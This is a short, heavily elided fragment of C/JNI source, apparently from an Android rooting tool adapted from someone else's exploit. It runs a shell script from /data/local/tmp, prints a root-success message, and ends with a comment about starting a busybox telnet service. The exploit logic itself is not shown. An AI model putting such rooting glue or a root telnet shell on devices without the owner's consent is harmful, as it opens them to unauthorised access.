...
/*
* Unkn0wn0ne - Provide JNI Overhead for RootMyValet. Also links to custom script
* Modified from CUBE's exploit
* This is just some test code - will be removed at a later date
*/
  ...
  (JNIEnv * je, jobject jo)
{
	...
	system("sh /data/local/tmp/exploit.sh");
	return 1;
}
...
int main(int argc, char **argv) {
	...
	printf("Succeeded in getroot!\n");
 /*	Unkn0wn0ne - We don't need this
   if (argc >= 2) {
		system(argv[1]);
	} else {
		system(EXECCOMMAND);
	} */
	//Unkn0wn0ne - Start busybox telnet
